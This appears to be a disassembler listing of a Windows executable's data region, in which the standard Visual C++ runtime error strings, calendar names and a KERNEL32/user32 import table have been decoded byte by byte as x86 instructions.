000057B2  49                dec ecx
000057B3  4E                dec esi
000057B4  46                inc esi
000057B5  0000              add [eax],al
000057B7  0031              add [ecx],dh
000057B9  23494E            and ecx,[ecx+0x4e]
000057BC  44                inc esp
000057BD  0000              add [eax],al
000057BF  0031              add [ecx],dh
000057C1  23534E            and edx,[ebx+0x4e]
000057C4  41                inc ecx
000057C5  4E                dec esi
000057C6  0000              add [eax],al
000057C8  7275              jc 0x583f
000057CA  6E                outsb
000057CB  7469              jz 0x5836
000057CD  6D                insd
000057CE  65206572          and [gs:ebp+0x72],ah
000057D2  726F              jc 0x5843
000057D4  7220              jc 0x57f6
000057D6  0000              add [eax],al
000057D8  0D0A000054        or eax,0x5400000a
000057DD  4C                dec esp
000057DE  4F                dec edi
000057DF  53                push ebx
000057E0  53                push ebx
000057E1  206572            and [ebp+0x72],ah
000057E4  726F              jc 0x5855
000057E6  720D              jc 0x57f5
000057E8  0A00              or al,[eax]
000057EA  0000              add [eax],al
000057EC  53                push ebx
000057ED  49                dec ecx
000057EE  4E                dec esi
000057EF  47                inc edi
000057F0  206572            and [ebp+0x72],ah
000057F3  726F              jc 0x5864
000057F5  720D              jc 0x5804
000057F7  0A00              or al,[eax]
000057F9  0000              add [eax],al
000057FB  00444F4D          add [edi+ecx*2+0x4d],al
000057FF  41                inc ecx
00005800  49                dec ecx
00005801  4E                dec esi
00005802  206572            and [ebp+0x72],ah
00005805  726F              jc 0x5876
00005807  720D              jc 0x5816
00005809  0A00              or al,[eax]
0000580B  005236            add [edx+0x36],dl
0000580E  3032              xor [edx],dh
00005810  380D0A2D2075      cmp [0x75202d0a],cl
00005816  6E                outsb
00005817  61                popa
00005818  626C6520          bound ebp,[ebp+0x20]
0000581C  746F              jz 0x588d
0000581E  20696E            and [ecx+0x6e],ch
00005821  697469616C697A65  imul esi,[ecx+ebp*2+0x61],dword 0x657a696c
00005829  206865            and [eax+0x65],ch
0000582C  61                popa
0000582D  700D              jo 0x583c
0000582F  0A00              or al,[eax]
00005831  0000              add [eax],al
00005833  005236            add [edx+0x36],dl
00005836  3032              xor [edx],dh
00005838  37                aaa
00005839  0D0A2D206E        or eax,0x6e202d0a
0000583E  6F                outsd
0000583F  7420              jz 0x5861
00005841  656E              gs outsb
00005843  6F                outsd
00005844  7567              jnz 0x58ad
00005846  6820737061        push dword 0x61707320
0000584B  636520            arpl [ebp+0x20],sp
0000584E  666F              outsw
00005850  7220              jc 0x5872
00005852  6C                insb
00005853  6F                outsd
00005854  7769              ja 0x58bf
00005856  6F                outsd
00005857  20696E            and [ecx+0x6e],ch
0000585A  697469616C697A61  imul esi,[ecx+ebp*2+0x61],dword 0x617a696c
00005862  7469              jz 0x58cd
00005864  6F                outsd
00005865  6E                outsb
00005866  0D0A000000        or eax,0xa
0000586B  005236            add [edx+0x36],dl
0000586E  3032              xor [edx],dh
00005870  360D0A2D206E      ss or eax,0x6e202d0a
00005876  6F                outsd
00005877  7420              jz 0x5899
00005879  656E              gs outsb
0000587B  6F                outsd
0000587C  7567              jnz 0x58e5
0000587E  6820737061        push dword 0x61707320
00005883  636520            arpl [ebp+0x20],sp
00005886  666F              outsw
00005888  7220              jc 0x58aa
0000588A  7374              jnc 0x5900
0000588C  64696F20696E6974  imul ebp,[fs:edi+0x20],dword 0x74696e69
00005894  69616C697A6174    imul esp,[ecx+0x6c],dword 0x74617a69
0000589B  696F6E0D0A0000    imul ebp,[edi+0x6e],dword 0xa0d
000058A2  0000              add [eax],al
000058A4  52                push edx
000058A5  363032            xor [ss:edx],dh
000058A8  350D0A2D20        xor eax,0x202d0a0d
000058AD  7075              jo 0x5924
000058AF  7265              jc 0x5916
000058B1  207669            and [esi+0x69],dh
000058B4  7274              jc 0x592a
000058B6  7561              jnz 0x5919
000058B8  6C                insb
000058B9  206675            and [esi+0x75],ah
000058BC  6E                outsb
000058BD  6374696F          arpl [ecx+ebp*2+0x6f],si
000058C1  6E                outsb
000058C2  206361            and [ebx+0x61],ah
000058C5  6C                insb
000058C6  6C                insb
000058C7  0D0A000000        or eax,0xa
000058CC  52                push edx
000058CD  363032            xor [ss:edx],dh
000058D0  340D              xor al,0xd
000058D2  0A2D206E6F74      or ch,[0x746f6e20]
000058D8  20656E            and [ebp+0x6e],ah
000058DB  6F                outsd
000058DC  7567              jnz 0x5945
000058DE  6820737061        push dword 0x61707320
000058E3  636520            arpl [ebp+0x20],sp
000058E6  666F              outsw
000058E8  7220              jc 0x590a
000058EA  5F                pop edi
000058EB  6F                outsd
000058EC  6E                outsb
000058ED  657869            gs js 0x5959
000058F0  742F              jz 0x5921
000058F2  61                popa
000058F3  7465              jz 0x595a
000058F5  7869              js 0x5960
000058F7  7420              jz 0x5919
000058F9  7461              jz 0x595c
000058FB  626C650D          bound ebp,[ebp+0xd]
000058FF  0A00              or al,[eax]
00005901  0000              add [eax],al
00005903  005236            add [edx+0x36],dl
00005906  3031              xor [ecx],dh
00005908  390D0A2D2075      cmp [0x75202d0a],ecx
0000590E  6E                outsb
0000590F  61                popa
00005910  626C6520          bound ebp,[ebp+0x20]
00005914  746F              jz 0x5985
00005916  206F70            and [edi+0x70],ch
00005919  656E              gs outsb
0000591B  20636F            and [ebx+0x6f],ah
0000591E  6E                outsb
0000591F  736F              jnc 0x5990
00005921  6C                insb
00005922  6520646576        and [gs:ebp+0x76],ah
00005927  6963650D0A0000    imul esp,[ebx+0x65],dword 0xa0d
0000592E  0000              add [eax],al
00005930  52                push edx
00005931  363031            xor [ss:ecx],dh
00005934  380D0A2D2075      cmp [0x75202d0a],cl
0000593A  6E                outsb
0000593B  657870            gs js 0x59ae
0000593E  6563746564        arpl [gs:ebp+0x64],si
00005943  206865            and [eax+0x65],ch
00005946  61                popa
00005947  7020              jo 0x5969
00005949  657272            gs jc 0x59be
0000594C  6F                outsd
0000594D  720D              jc 0x595c
0000594F  0A00              or al,[eax]
00005951  0000              add [eax],al
00005953  005236            add [edx+0x36],dl
00005956  3031              xor [ecx],dh
00005958  37                aaa
00005959  0D0A2D2075        or eax,0x75202d0a
0000595E  6E                outsb
0000595F  657870            gs js 0x59d2
00005962  6563746564        arpl [gs:ebp+0x64],si
00005967  206D75            and [ebp+0x75],ch
0000596A  6C                insb
0000596B  7469              jz 0x59d6
0000596D  7468              jz 0x59d7
0000596F  7265              jc 0x59d6
00005971  61                popa
00005972  64206C6F63        and [fs:edi+ebp*2+0x63],ch
00005977  6B2065            imul esp,[eax],byte +0x65
0000597A  7272              jc 0x59ee
0000597C  6F                outsd
0000597D  720D              jc 0x598c
0000597F  0A00              or al,[eax]
00005981  0000              add [eax],al
00005983  005236            add [edx+0x36],dl
00005986  3031              xor [ecx],dh
00005988  360D0A2D206E      ss or eax,0x6e202d0a
0000598E  6F                outsd
0000598F  7420              jz 0x59b1
00005991  656E              gs outsb
00005993  6F                outsd
00005994  7567              jnz 0x59fd
00005996  6820737061        push dword 0x61707320
0000599B  636520            arpl [ebp+0x20],sp
0000599E  666F              outsw
000059A0  7220              jc 0x59c2
000059A2  7468              jz 0x5a0c
000059A4  7265              jc 0x5a0b
000059A6  61                popa
000059A7  6420646174        and [fs:ecx+0x74],ah
000059AC  61                popa
000059AD  0D0A000D0A        or eax,0xa0d000a
000059B2  61                popa
000059B3  626E6F            bound ebp,[esi+0x6f]
000059B6  726D              jc 0x5a25
000059B8  61                popa
000059B9  6C                insb
000059BA  207072            and [eax+0x72],dh
000059BD  6F                outsd
000059BE  677261            a16 jc 0x5a22
000059C1  6D                insd
000059C2  20746572          and [ebp+0x72],dh
000059C6  6D                insd
000059C7  696E6174696F6E    imul ebp,[esi+0x61],dword 0x6e6f6974
000059CE  0D0A000000        or eax,0xa
000059D3  005236            add [edx+0x36],dl
000059D6  3030              xor [eax],dh
000059D8  390D0A2D206E      cmp [0x6e202d0a],ecx
000059DE  6F                outsd
000059DF  7420              jz 0x5a01
000059E1  656E              gs outsb
000059E3  6F                outsd
000059E4  7567              jnz 0x5a4d
000059E6  6820737061        push dword 0x61707320
000059EB  636520            arpl [ebp+0x20],sp
000059EE  666F              outsw
000059F0  7220              jc 0x5a12
000059F2  656E              gs outsb
000059F4  7669              jna 0x5a5f
000059F6  726F              jc 0x5a67
000059F8  6E                outsb
000059F9  6D                insd
000059FA  656E              gs outsb
000059FC  740D              jz 0x5a0b
000059FE  0A00              or al,[eax]
00005A00  52                push edx
00005A01  363030            xor [ss:eax],dh
00005A04  380D0A2D206E      cmp [0x6e202d0a],cl
00005A0A  6F                outsd
00005A0B  7420              jz 0x5a2d
00005A0D  656E              gs outsb
00005A0F  6F                outsd
00005A10  7567              jnz 0x5a79
00005A12  6820737061        push dword 0x61707320
00005A17  636520            arpl [ebp+0x20],sp
00005A1A  666F              outsw
00005A1C  7220              jc 0x5a3e
00005A1E  61                popa
00005A1F  7267              jc 0x5a88
00005A21  756D              jnz 0x5a90
00005A23  656E              gs outsb
00005A25  7473              jz 0x5a9a
00005A27  0D0A000000        or eax,0xa
00005A2C  52                push edx
00005A2D  363030            xor [ss:eax],dh
00005A30  320D0A2D2066      xor cl,[0x66202d0a]
00005A36  6C                insb
00005A37  6F                outsd
00005A38  61                popa
00005A39  7469              jz 0x5aa4
00005A3B  6E                outsb
00005A3C  6720706F          and [bx+si+0x6f],dh
00005A40  696E74206E6F74    imul ebp,[esi+0x74],dword 0x746f6e20
00005A47  206C6F61          and [edi+ebp*2+0x61],ch
00005A4B  6465640D0A000000  fs or eax,0xa
00005A53  004D69            add [ebp+0x69],cl
00005A56  63726F            arpl [edx+0x6f],si
00005A59  736F              jnc 0x5aca
00005A5B  667420            o16 jz 0x5a7e
00005A5E  56                push esi
00005A5F  697375616C2043    imul esi,[ebx+0x75],dword 0x43206c61
00005A66  2B2B              sub ebp,[ebx]
00005A68  205275            and [edx+0x75],dl
00005A6B  6E                outsb
00005A6C  7469              jz 0x5ad7
00005A6E  6D                insd
00005A6F  65204C6962        and [gs:ecx+ebp*2+0x62],cl
00005A74  7261              jc 0x5ad7
00005A76  7279              jc 0x5af1
00005A78  0000              add [eax],al
00005A7A  0000              add [eax],al
00005A7C  0A0A              or cl,[edx]
00005A7E  0000              add [eax],al
00005A80  52                push edx
00005A81  756E              jnz 0x5af1
00005A83  7469              jz 0x5aee
00005A85  6D                insd
00005A86  65204572          and [gs:ebp+0x72],al
00005A8A  726F              jc 0x5afb
00005A8C  7221              jc 0x5aaf
00005A8E  0A0A              or cl,[edx]
00005A90  50                push eax
00005A91  726F              jc 0x5b02
00005A93  677261            a16 jc 0x5af7
00005A96  6D                insd
00005A97  3A20              cmp ah,[eax]
00005A99  0000              add [eax],al
00005A9B  002E              add [esi],ch
00005A9D  2E2E003C70        add [cs:eax+esi*2],bh
00005AA2  726F              jc 0x5b13
00005AA4  677261            a16 jc 0x5b08
00005AA7  6D                insd
00005AA8  206E61            and [esi+0x61],ch
00005AAB  6D                insd
00005AAC  6520756E          and [gs:ebp+0x6e],dh
00005AB0  6B6E6F77          imul ebp,[esi+0x6f],byte +0x77
00005AB4  6E                outsb
00005AB5  3E0000            add [ds:eax],al
00005AB8  48                dec eax
00005AB9  3A6D6D            cmp ch,[ebp+0x6d]
00005ABC  3A7373            cmp dh,[ebx+0x73]
00005ABF  00646464          add [esp+0x64],ah
00005AC3  642C20            fs sub al,0x20
00005AC6  4D                dec ebp
00005AC7  4D                dec ebp
00005AC8  4D                dec ebp
00005AC9  4D                dec ebp
00005ACA  2064642C          and [esp+0x2c],ah
00005ACE  207979            and [ecx+0x79],bh
00005AD1  7979              jns 0x5b4c
00005AD3  004D2F            add [ebp+0x2f],cl
00005AD6  642F              fs das
00005AD8  7979              jns 0x5b53
00005ADA  0000              add [eax],al
00005ADC  50                push eax
00005ADD  4D                dec ebp
00005ADE  0000              add [eax],al
00005AE0  41                inc ecx
00005AE1  4D                dec ebp
00005AE2  0000              add [eax],al
00005AE4  44                inc esp
00005AE5  6563656D          arpl [gs:ebp+0x6d],sp
00005AE9  626572            bound esp,[ebp+0x72]
00005AEC  0000              add [eax],al
00005AEE  0000              add [eax],al
00005AF0  4E                dec esi
00005AF1  6F                outsd
00005AF2  7665              jna 0x5b59
00005AF4  6D                insd
00005AF5  626572            bound esp,[ebp+0x72]
00005AF8  0000              add [eax],al
00005AFA  0000              add [eax],al
00005AFC  4F                dec edi
00005AFD  63746F62          arpl [edi+ebp*2+0x62],si
00005B01  657200            gs jc 0x5b04
00005B04  53                push ebx
00005B05  657074            gs jo 0x5b7c
00005B08  656D              gs insd
00005B0A  626572            bound esp,[ebp+0x72]
00005B0D  0000              add [eax],al
00005B0F  004175            add [ecx+0x75],al
00005B12  677573            a16 jnz 0x5b88
00005B15  7400              jz 0x5b17
00005B17  004A75            add [edx+0x75],cl
00005B1A  6C                insb
00005B1B  7900              jns 0x5b1d
00005B1D  0000              add [eax],al
00005B1F  004A75            add [edx+0x75],cl
00005B22  6E                outsb
00005B23  650000            add [gs:eax],al
00005B26  0000              add [eax],al
00005B28  41                inc ecx
00005B29  7072              jo 0x5b9d
00005B2B  696C0000004D6172  imul ebp,[eax+eax+0x0],dword 0x72614d00
00005B33  636800            arpl [eax+0x0],bp
00005B36  0000              add [eax],al
00005B38  46                inc esi
00005B39  65627275          bound esi,[gs:edx+0x75]
00005B3D  61                popa
00005B3E  7279              jc 0x5bb9
00005B40  0000              add [eax],al
00005B42  0000              add [eax],al
00005B44  4A                dec edx
00005B45  61                popa
00005B46  6E                outsb
00005B47  7561              jnz 0x5baa
00005B49  7279              jc 0x5bc4
00005B4B  00446563          add [ebp+0x63],al
00005B4F  004E6F            add [esi+0x6f],cl
00005B52  7600              jna 0x5b54
00005B54  4F                dec edi
00005B55  63740053          arpl [eax+eax+0x53],si
00005B59  657000            gs jo 0x5b5c
00005B5C  41                inc ecx
00005B5D  7567              jnz 0x5bc6
00005B5F  004A75            add [edx+0x75],cl
00005B62  6C                insb
00005B63  004A75            add [edx+0x75],cl
00005B66  6E                outsb
00005B67  004D61            add [ebp+0x61],cl
00005B6A  7900              jns 0x5b6c
00005B6C  41                inc ecx
00005B6D  7072              jo 0x5be1
00005B6F  004D61            add [ebp+0x61],cl
00005B72  7200              jc 0x5b74
00005B74  46                inc esi
00005B75  656200            bound eax,[gs:eax]
00005B78  4A                dec edx
00005B79  61                popa
00005B7A  6E                outsb
00005B7B  005361            add [ebx+0x61],dl
00005B7E  7475              jz 0x5bf5
00005B80  7264              jc 0x5be6
00005B82  61                popa
00005B83  7900              jns 0x5b85
00005B85  0000              add [eax],al
00005B87  004672            add [esi+0x72],al
00005B8A  6964617900005468  imul esp,[ecx+0x79],dword 0x68540000
00005B92  7572              jnz 0x5c06
00005B94  7364              jnc 0x5bfa
00005B96  61                popa
00005B97  7900              jns 0x5b99
00005B99  0000              add [eax],al
00005B9B  005765            add [edi+0x65],dl
00005B9E  646E              fs outsb
00005BA0  657364            gs jnc 0x5c07
00005BA3  61                popa
00005BA4  7900              jns 0x5ba6
00005BA6  0000              add [eax],al
00005BA8  54                push esp
00005BA9  7565              jnz 0x5c10
00005BAB  7364              jnc 0x5c11
00005BAD  61                popa
00005BAE  7900              jns 0x5bb0
00005BB0  4D                dec ebp
00005BB1  6F                outsd
00005BB2  6E                outsb
00005BB3  6461              fs popa
00005BB5  7900              jns 0x5bb7
00005BB7  005375            add [ebx+0x75],dl
00005BBA  6E                outsb
00005BBB  6461              fs popa
00005BBD  7900              jns 0x5bbf
00005BBF  005361            add [ebx+0x61],dl
00005BC2  7400              jz 0x5bc4
00005BC4  46                inc esi
00005BC5  7269              jc 0x5c30
00005BC7  00546875          add [eax+ebp*2+0x75],dl
00005BCB  005765            add [edi+0x65],dl
00005BCE  6400547565        add [fs:ebp+esi*2+0x65],dl
00005BD3  004D6F            add [ebp+0x6f],cl
00005BD6  6E                outsb
00005BD7  005375            add [ebx+0x75],dl
00005BDA  6E                outsb
00005BDB  004765            add [edi+0x65],al
00005BDE  744C              jz 0x5c2c
00005BE0  61                popa
00005BE1  7374              jnc 0x5c57
00005BE3  41                inc ecx
00005BE4  63746976          arpl [ecx+ebp*2+0x76],si
00005BE8  6550              gs push eax
00005BEA  6F                outsd
00005BEB  7075              jo 0x5c62
00005BED  7000              jo 0x5bef
00005BEF  004765            add [edi+0x65],al
00005BF2  7441              jz 0x5c35
00005BF4  63746976          arpl [ecx+ebp*2+0x76],si
00005BF8  6557              gs push edi
00005BFA  696E646F77004D    imul ebp,[esi+0x64],dword 0x4d00776f
00005C01  657373            gs jnc 0x5c77
00005C04  61                popa
00005C05  676542            gs a16 inc edx
00005C08  6F                outsd
00005C09  7841              js 0x5c4c
00005C0B  007573            add [ebp+0x73],dh
00005C0E  657233            gs jc 0x5c44
00005C11  322E              xor ch,[esi]
00005C13  646C              fs insb
00005C15  6C                insb
00005C16  0000              add [eax],al
00005C18  53                push ebx
00005C19  756E              jnz 0x5c89
00005C1B  4D                dec ebp
00005C1C  6F                outsd
00005C1D  6E                outsb
00005C1E  54                push esp
00005C1F  7565              jnz 0x5c86
00005C21  57                push edi
00005C22  656454            fs push esp
00005C25  6875467269        push dword 0x69724675
00005C2A  53                push ebx
00005C2B  61                popa
00005C2C  7400              jz 0x5c2e
00005C2E  0000              add [eax],al
00005C30  4A                dec edx
00005C31  61                popa
00005C32  6E                outsb
00005C33  46                inc esi
00005C34  65624D61          bound ecx,[gs:ebp+0x61]
00005C38  7241              jc 0x5c7b
00005C3A  7072              jo 0x5cae
00005C3C  4D                dec ebp
00005C3D  61                popa
00005C3E  794A              jns 0x5c8a
00005C40  756E              jnz 0x5cb0
00005C42  4A                dec edx
00005C43  756C              jnz 0x5cb1
00005C45  41                inc ecx
00005C46  7567              jnz 0x5caf
00005C48  53                push ebx
00005C49  65704F            gs jo 0x5c9b
00005C4C  63744E6F          arpl [esi+ecx*2+0x6f],si
00005C50  7644              jna 0x5c96
00005C52  656300            arpl [gs:eax],ax
00005C55  0000              add [eax],al
00005C57  00805C000000      add [eax+0x5c],al
00005C5D  0000              add [eax],al
00005C5F  0000              add [eax],al
00005C61  0000              add [eax],al
00005C63  00F4              add ah,dh
00005C65  5E                pop esi
00005C66  0000              add [eax],al
00005C68  90                nop
00005C69  56                push esi
00005C6A  0000              add [eax],al
00005C6C  0000              add [eax],al
00005C6E  0000              add [eax],al
00005C70  0000              add [eax],al
00005C72  0000              add [eax],al
00005C74  0000              add [eax],al
00005C76  0000              add [eax],al
00005C78  0000              add [eax],al
00005C7A  0000              add [eax],al
00005C7C  0000              add [eax],al
00005C7E  0000              add [eax],al
00005C80  F8                clc
00005C81  5C                pop esp
00005C82  0000              add [eax],al
00005C84  0A5D00            or bl,[ebp+0x0]
00005C87  001E              add [esi],bl
00005C89  5D                pop ebp
00005C8A  0000              add [eax],al
00005C8C  365D              ss pop ebp
00005C8E  0000              add [eax],al
00005C90  4E                dec esi
00005C91  5D                pop ebp
00005C92  0000              add [eax],al
00005C94  645D              fs pop ebp
00005C96  0000              add [eax],al
00005C98  765D              jna 0x5cf7
00005C9A  0000              add [eax],al
00005C9C  885D00            mov [ebp+0x0],bl
00005C9F  00A45D0000BC5D    add [ebp+ebx*2+0x5dbc0000],ah
00005CA6  0000              add [eax],al
00005CA8  D45D              aam 0x5d
00005CAA  0000              add [eax],al
00005CAC  E25D              loop 0x5d0b
00005CAE  0000              add [eax],al
00005CB0  F8                clc
00005CB1  5D                pop ebp
00005CB2  0000              add [eax],al
00005CB4  085E00            or [esi+0x0],bl
00005CB7  0018              add [eax],bl
00005CB9  5E                pop esi
00005CBA  0000              add [eax],al
00005CBC  245E              and al,0x5e
00005CBE  0000              add [eax],al
00005CC0  385E00            cmp [esi+0x0],bl
00005CC3  004C5E00          add [esi+ebx*2+0x0],cl
00005CC7  00585E            add [eax+0x5e],bl
00005CCA  0000              add [eax],al
00005CCC  645E              fs pop esi
00005CCE  0000              add [eax],al
00005CD0  705E              jo 0x5d30
00005CD2  0000              add [eax],al
00005CD4  865E00            xchg bl,[esi+0x0]
00005CD7  00965E0000A4      add [esi+0xa400005e],dl
00005CDD  5E                pop esi
00005CDE  0000              add [eax],al
00005CE0  B05E              mov al,0x5e
00005CE2  0000              add [eax],al
00005CE4  C05E0000          rcr byte [esi+0x0],0x0
00005CE8  CE                into
00005CE9  5E                pop esi
00005CEA  0000              add [eax],al
00005CEC  D85E00            fcomp dword [esi+0x0]
00005CEF  00E4              add ah,ah
00005CF1  5E                pop esi
00005CF2  0000              add [eax],al
00005CF4  0000              add [eax],al
00005CF6  0000              add [eax],al
00005CF8  3E014765          add [ds:edi+0x65],eax
00005CFC  7450              jz 0x5d4e
00005CFE  726F              jc 0x5d6f
00005D00  634164            arpl [ecx+0x64],ax
00005D03  647265            fs jc 0x5d6b
00005D06  7373              jnc 0x5d7b
00005D08  0000              add [eax],al
00005D0A  26014765          add [es:edi+0x65],eax
00005D0E  744D              jz 0x5d5d
00005D10  6F                outsd
00005D11  64756C            fs jnz 0x5d80
00005D14  6548              gs dec eax
00005D16  61                popa
00005D17  6E                outsb
00005D18  646C              fs insb
00005D1A  6541              gs inc ecx
00005D1C  0000              add [eax],al
00005D1E  AD                lodsd
00005D1F  01496E            add [ecx+0x6e],ecx
00005D22  7465              jz 0x5d89
00005D24  726C              jc 0x5d92
00005D26  6F                outsd
00005D27  636B65            arpl [ebx+0x65],bp
00005D2A  6444              fs inc esp
00005D2C  65637265          arpl [gs:edx+0x65],si
00005D30  6D                insd
00005D31  656E              gs outsb
00005D33  7400              jz 0x5d35
00005D35  00B001496E74      add [eax+0x746e4901],dh
00005D3B  65726C            gs jc 0x5daa
00005D3E  6F                outsd
00005D3F  636B65            arpl [ebx+0x65],bp
00005D42  6449              fs dec ecx
00005D44  6E                outsb
00005D45  637265            arpl [edx+0x65],si
00005D48  6D                insd
00005D49  656E              gs outsb
00005D4B  7400              jz 0x5d4d
00005D4D  00E4              add ah,ah
00005D4F  014D75            add [ebp+0x75],ecx
00005D52  6C                insb
00005D53  7469              jz 0x5dbe
00005D55  42                inc edx
00005D56  7974              jns 0x5dcc
00005D58  6554              gs push esp
00005D5A  6F                outsd
00005D5B  57                push edi
00005D5C  6964654368617200  imul esp,[ebp+0x43],dword 0x726168
00005D64  53                push ebx
00005D65  014765            add [edi+0x65],eax
00005D68  7453              jz 0x5dbd
00005D6A  7472              jz 0x5dde
00005D6C  696E6754797065    imul ebp,[esi+0x67],dword 0x65707954
00005D73  41                inc ecx
00005D74  0000              add [eax],al
00005D76  56                push esi
00005D77  014765            add [edi+0x65],eax
00005D7A  7453              jz 0x5dcf
00005D7C  7472              jz 0x5df0
00005D7E  696E6754797065    imul ebp,[esi+0x67],dword 0x65707954
00005D85  57                push edi
00005D86  0000              add [eax],al
00005D88  AA                stosb
00005D89  01496E            add [ecx+0x6e],ecx
00005D8C  697469616C697A65  imul esi,[ecx+ebp*2+0x61],dword 0x657a696c
00005D94  43                inc ebx
00005D95  7269              jc 0x5e00
00005D97  7469              jz 0x5e02
00005D99  63616C            arpl [ecx+0x6c],sp
00005D9C  53                push ebx
00005D9D  656374696F        arpl [gs:ecx+ebp*2+0x6f],si
00005DA2  6E                outsb
00005DA3  006600            add [esi+0x0],ah
00005DA6  45                inc ebp
00005DA7  6E                outsb
00005DA8  7465              jz 0x5e0f
00005DAA  7243              jc 0x5def
00005DAC  7269              jc 0x5e17
00005DAE  7469              jz 0x5e19
00005DB0  63616C            arpl [ecx+0x6c],sp
00005DB3  53                push ebx
00005DB4  656374696F        arpl [gs:ecx+ebp*2+0x6f],si
00005DB9  6E                outsb
00005DBA  0000              add [eax],al
00005DBC  C1014C            rol dword [ecx],0x4c
00005DBF  6561              gs popa
00005DC1  7665              jna 0x5e28
00005DC3  43                inc ebx
00005DC4  7269              jc 0x5e2f
00005DC6  7469              jz 0x5e31
00005DC8  63616C            arpl [ecx+0x6c],sp
00005DCB  53                push ebx
00005DCC  656374696F        arpl [gs:ecx+ebp*2+0x6f],si
00005DD1  6E                outsb
00005DD2  0000              add [eax],al
00005DD4  7D00              jnl 0x5dd6
00005DD6  45                inc ebp
00005DD7  7869              js 0x5e42
00005DD9  7450              jz 0x5e2b
00005DDB  726F              jc 0x5e4c
00005DDD  636573            arpl [ebp+0x73],sp
00005DE0  7300              jnc 0x5de2
00005DE2  D202              rol byte [edx],cl
00005DE4  57                push edi
00005DE5  6964654368617254  imul esp,[ebp+0x43],dword 0x54726168
00005DED  6F                outsd
00005DEE  4D                dec ebp
00005DEF  756C              jnz 0x5e5d
00005DF1  7469              jz 0x5e5c
00005DF3  42                inc edx
00005DF4  7974              jns 0x5e6a
00005DF6  6500BF014C434D    add [gs:edi+0x4d434c01],bh
00005DFD  61                popa
00005DFE  7053              jo 0x5e53
00005E00  7472              jz 0x5e74
00005E02  696E67410000C0    imul ebp,[esi+0x67],dword 0xc0000041
00005E09  014C434D          add [ebx+eax*2+0x4d],ecx
00005E0D  61                popa
00005E0E  7053              jo 0x5e63
00005E10  7472              jz 0x5e84
00005E12  696E6757000099    imul ebp,[esi+0x67],dword 0x99000057
00005E19  014865            add [eax+0x65],ecx
00005E1C  61                popa
00005E1D  7041              jo 0x5e60
00005E1F  6C                insb
00005E20  6C                insb
00005E21  6F                outsd
00005E22  6300              arpl [eax],ax
00005E24  9E                sahf
00005E25  02546572          add dl,[ebp+0x72]
00005E29  6D                insd
00005E2A  696E6174655072    imul ebp,[esi+0x61],dword 0x72506574
00005E31  6F                outsd
00005E32  636573            arpl [ebp+0x73],sp
00005E35  7300              jnc 0x5e37
00005E37  00F7              add bh,dh
00005E39  004765            add [edi+0x65],al
00005E3C  7443              jz 0x5e81
00005E3E  7572              jnz 0x5eb2
00005E40  7265              jc 0x5ea7
00005E42  6E                outsb
00005E43  7450              jz 0x5e95
00005E45  726F              jc 0x5eb6
00005E47  636573            arpl [ebp+0x73],sp
00005E4A  7300              jnc 0x5e4c
00005E4C  2F                das
00005E4D  025274            add dl,[edx+0x74]
00005E50  6C                insb
00005E51  55                push ebp
00005E52  6E                outsb
00005E53  7769              ja 0x5ebe
00005E55  6E                outsb
00005E56  64009F01486561    add [fs:edi+0x61654801],bl
00005E5D  7046              jo 0x5ea5
00005E5F  7265              jc 0x5ec6
00005E61  650000            add [gs:eax],al
00005E64  BF00476574        mov edi,0x74654700
00005E69  43                inc ebx
00005E6A  50                push eax
00005E6B  49                dec ecx
00005E6C  6E                outsb
00005E6D  666F              outsw
00005E6F  002401            add [ecx+eax],ah
00005E72  47                inc edi
00005E73  65744D            gs jz 0x5ec3
00005E76  6F                outsd
00005E77  64756C            fs jnz 0x5ee6
00005E7A  6546              gs inc esi
00005E7C  696C654E616D6541  imul ebp,[ebp+0x4e],dword 0x41656d61
00005E84  0000              add [eax],al
00005E86  52                push edx
00005E87  014765            add [edi+0x65],eax
00005E8A  7453              jz 0x5edf
00005E8C  7464              jz 0x5ef2
00005E8E  48                dec eax
00005E8F  61                popa
00005E90  6E                outsb
00005E91  646C              fs insb
00005E93  650000            add [gs:eax],al
00005E96  BF02566972        mov edi,0x72695602
00005E9B  7475              jz 0x5f12
00005E9D  61                popa
00005E9E  6C                insb
00005E9F  46                inc esi
00005EA0  7265              jc 0x5f07
00005EA2  6500DF            gs add bh,bl
00005EA5  025772            add dl,[edi+0x72]
00005EA8  69746546696C6500  imul esi,[ebp+0x46],dword 0x656c69
00005EB0  BB02566972        mov ebx,0x72695602
00005EB5  7475              jz 0x5f2c
00005EB7  61                popa
00005EB8  6C                insb
00005EB9  41                inc ecx
00005EBA  6C                insb
00005EBB  6C                insb
00005EBC  6F                outsd
00005EBD  6300              arpl [eax],ax
00005EBF  00A201486561      add [edx+0x61654801],ah
00005EC5  7052              jo 0x5f19
00005EC7  6541              gs inc ecx
00005EC9  6C                insb
00005ECA  6C                insb
00005ECB  6F                outsd
00005ECC  6300              arpl [eax],ax
00005ECE  B900476574        mov ecx,0x74654700
00005ED3  41                inc ecx
00005ED4  43                inc ebx
00005ED5  50                push eax
00005ED6  0000              add [eax],al
00005ED8  3101              xor [ecx],eax
00005EDA  47                inc edi
00005EDB  65744F            gs jz 0x5f2d
00005EDE  45                inc ebp
00005EDF  4D                dec ebp
00005EE0  43                inc ebx
00005EE1  50                push eax
00005EE2  0000              add [eax],al
00005EE4  C2014C            ret 0x4c01
00005EE7  6F                outsd
00005EE8  61                popa
00005EE9  644C              fs dec esp
00005EEB  69627261727941    imul esp,[edx+0x72],dword 0x41797261
00005EF2  0000              add [eax],al
00005EF4  4B                dec ebx
00005EF5  45                inc ebp
00005EF6  52                push edx
00005EF7  4E                dec esi
00005EF8  45                inc ebp
00005EF9  4C                dec esp
00005EFA  3332              xor esi,[edx]
00005EFC  2E646C            fs insb
00005EFF  6C                insb
00005F00  0000              add [eax],al
00005F02  0000              add [eax],al
00005F04  0000              add [eax],al
00005F06  0000              add [eax],al
00005F08  0000              add [eax],al
00005F0A  0000              add [eax],al
00005F0C  0000              add [eax],al
00005F0E  0000              add [eax],al
00005F10  0000              add [eax],al
00005F12  0000              add [eax],al
00005F14  0000              add [eax],al
00005F16  0000              add [eax],al
00005F18  0000              add [eax],al
00005F1A  0000              add [eax],al
00005F1C  D9531E            fst dword [ebx+0x1e]
00005F1F  0000              add [eax],al
00005F21  0000              add [eax],al
00005F23  0000              add [eax],al
00005F25  0000              add [eax],al
00005F27  0000              add [eax],al
00005F29  0000              add [eax],al
00005F2B  0000              add [eax],al
00005F2D  0000              add [eax],al
00005F2F  0000              add [eax],al
00005F31  0000              add [eax],al
00005F33  0000              add [eax],al
00005F35  0000              add [eax],al
00005F37  0000              add [eax],al
00005F39  0000              add [eax],al
00005F3B  0000              add [eax],al
00005F3D  0000              add [eax],al
00005F3F  004361            add [ebx+0x61],al
